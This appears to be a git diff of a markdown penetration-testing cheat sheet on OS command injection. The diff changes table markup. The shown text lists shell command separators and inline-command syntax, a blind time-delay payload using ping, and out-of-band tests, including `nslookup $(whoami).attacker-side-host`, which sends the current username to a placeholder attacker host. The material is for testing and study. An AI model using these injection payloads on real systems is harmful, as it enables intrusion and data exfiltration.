@@ -5,8 +5,6 @@ Execute arbitrary command line functions by altering input that is used as an ar
 #### Command Line Cheat Sheet
 
 <table>
-<tr><th>Command Separation </th><th>Useful Commands</th></tr>
-<tr><td>
 
 | **Universal**   |
 |------------|
@@ -17,7 +15,6 @@ Execute arbitrary command line functions by altering input that is used as an ar
 | &&  |
 | \|\|  |
 
-</td><td>
 
 |**Description** | **Unix**   | **Windows**   |
 |-|------------|---------------|
@@ -29,9 +26,7 @@ Execute arbitrary command line functions by altering input that is used as an ar
 | command separation like ENTER | ; | |
 | inline command | \`cmd\` | |
 | inline command | $(cmd) | |
-
-
-</td></tr> </table>
+ </table>
 
 #### Blind OSCI
 Often the output cannot be seen, so a time delay can used: `& ping -c 10 127.0.0.1 &`. However, this works only for sequential handling of commands.
@@ -43,3 +38,4 @@ Output can also be written to files and then accessed from the browser:
 In case statements are handled asynchronously, an out-of-band attack can be useful to check for a CI vulnerability:
   * `nslookup attacker-side-host`
   * `nslookup $(whoami).attacker-side-host`
+  * 
